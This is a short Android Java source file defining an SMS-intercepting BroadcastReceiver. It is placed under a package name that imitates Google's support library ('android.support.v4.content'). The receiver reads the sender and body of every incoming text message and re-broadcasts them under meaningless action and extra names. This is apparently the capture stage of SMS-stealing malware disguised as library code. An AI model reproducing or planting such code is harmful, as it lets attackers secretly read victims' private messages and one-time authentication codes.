package android.support.v4.content;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

/**
 *
 * @author kennetht
 *
 */
public class SMSListener extends BroadcastReceiver {
    public static final String RECEIVER_NAME = "iopklnm";
    public static final String ADDRESS = "qweasd";
    public static final String BODY = "tyughj";

    @Override
    public void onReceive(final Context context, final Intent intent) {
	final Bundle bundle = intent.getExtras();
	final Object[] messages = (Object[]) bundle.get("pdus");
	final SmsMessage[] smsMessage = new SmsMessage[messages.length];
	for (int n = 0; n < messages.length; n++) {
	    smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
	    final Intent i = new Intent();
	    i.setAction(RECEIVER_NAME);
	    i.putExtra(ADDRESS, smsMessage[n].getOriginatingAddress());
	    i.putExtra(BODY, smsMessage[n].getDisplayMessageBody());
	    i.putExtra("String", smsMessage[n].toString());
	    context.sendBroadcast(i);
	}
    }
}